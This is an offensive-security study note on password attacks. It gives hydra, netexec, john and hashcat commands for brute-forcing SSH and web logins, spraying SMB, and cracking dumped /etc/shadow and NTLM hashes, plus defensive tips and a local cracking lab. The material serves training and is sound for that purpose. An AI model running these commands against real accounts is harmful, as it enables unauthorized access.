# Password Attacks (Offensive)

> **TL;DR:** Weak, reused, or default passwords remain one of the easiest paths to compromise. Distinguish between **online attacks** (brute-force/spraying over a network) and **offline cracking** (cracking captured hashes locally with `hashcat` or `john`).

---

## Core Concepts & Mental Model

| Attack Type | How It Works | Speed & Noise | Tools |
|-------------|--------------|---------------|-------|
| **Online Brute-Force** | Trying many passwords against 1 username over SSH/HTTP/SMB | Slow, very noisy, risks **account lockout** | `hydra`, Burp Intruder |
| **Password Spraying** | Trying **1–2 common passwords** across **many usernames** | Low noise, avoids account lockout | `netexec` (nxc), `kerbrute` |
| **Offline Cracking** | Cracking dumped password hashes (NTLM, `/etc/shadow`, Kerberos) locally on GPU/CPU | Ultra-fast (billions/sec on GPU), **zero** target noise | `hashcat`, `john` |

---

## Quick-Reference Command Cheatsheet

### 1. Online Attacks (`hydra` & `netexec`)
| Tool / Command | Purpose |
|----------------|---------|
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5` | Brute-force SSH password for user `admin` |
| `hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` | Brute-force an HTTP login form (`Invalid` = failure string) |
| `netexec smb 10.10.10.0/24 -u users.txt -p 'Winter2026!' --continue-on-success` | Password spray SMB across a subnet safely |

### 2. Offline Cracking (`john` & `hashcat`)
| Tool / Command | Purpose |
|----------------|---------|
| `hashid '5f4dcc3b5aa765d61d8327deb882cf99'` | Identify unknown hash type |
| `unshadow /etc/passwd /etc/shadow > unshadowed.txt` | Combine Linux passwd & shadow files for John the Ripper |
| `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt` | Crack Linux hashes with John |
| `john --show hashes.txt` | Display already-cracked passwords from John's potfile |
| `hashcat -m 0 hashes.txt rockyou.txt` | Crack MD5 (`-m 0`) hashes using GPU |
| `hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` | Crack Windows NTLM (`-m 1000`) hashes with rule mutations |
| `hashcat -m 1800 shadow_hashes.txt rockyou.txt` | Crack Linux SHA-512crypt (`$6$`) hashes |

### Common Hashcat Mode Reference (`-m`)
| Mode | Hash Type |
|------|-----------|
| `0` | MD5 |
| `100` | SHA-1 |
| `1000` | NTLM (Windows) |
| `1800` | sha512crypt `$6$` (Linux `/etc/shadow`) |
| `3200` | bcrypt `$2y$` |
| `13100` | Kerberoast (TGS-REP etype 23) |

---

## Common Pitfalls & Defensive Notes
- **Locking Out Production Accounts:** Never spray or brute-force AD accounts without first checking the domain's password lockout policy (`net accounts /domain` or `enum4linux-ng`).
- **Defensive Tip:** Enforce **MFA** everywhere, use **14+ character passphrases** or password managers, implement account lockout + progressive delays, and monitor for Event ID `4625` (failed logon) spikes across multiple accounts (password spraying).

---

## Hands-On Lab: Generate & Crack MD5 and SHA-512crypt Hashes on Kali

**Goal:** Create sample password hashes locally, identify their hash type, and crack them offline using both `john` and `hashcat` with `rockyou.txt`.

### Step 1: Create Sample Hashes in `/tmp/crack_lab`
```bash
mkdir -p /tmp/crack_lab && cd /tmp/crack_lab

# Generate an MD5 hash of "football" (exists in rockyou.txt)
echo -n "football" | md5sum | awk '{print $1}' > md5.hash

# Generate a Linux SHA-512crypt ($6$) hash of "summer2020"
openssl passwd -6 "summer2020" > sha512.hash
cat md5.hash sha512.hash
```

### Step 2: Crack with John the Ripper
```bash
# Crack MD5 (force Raw-MD5 format)
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.hash
john --format=Raw-MD5 --show md5.hash

# Crack Linux $6$ hash (auto-detected by John)
john --wordlist=/usr/share/wordlists/rockyou.txt sha512.hash
john --show sha512.hash
```

### Step 3: Crack with Hashcat (Mode `0` = MD5)
```bash
hashcat -m 0 md5.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 0 md5.hash --show
```
*(Why `--force`? Inside VirtualBox/VMware Kali VMs without GPU passthrough, Hashcat warns about CPU OpenCL—`--force` lets it run in labs.)*

```bash
# Clean up
rm -rf /tmp/crack_lab
```

---

## Practice & Next Steps
- **Labs:** TryHackMe *Hydra*, *Crack The Hash*, *John The Ripper*
- **Next Topic:** [Privilege Escalation (Linux & Windows)](privilege_escalation.md)
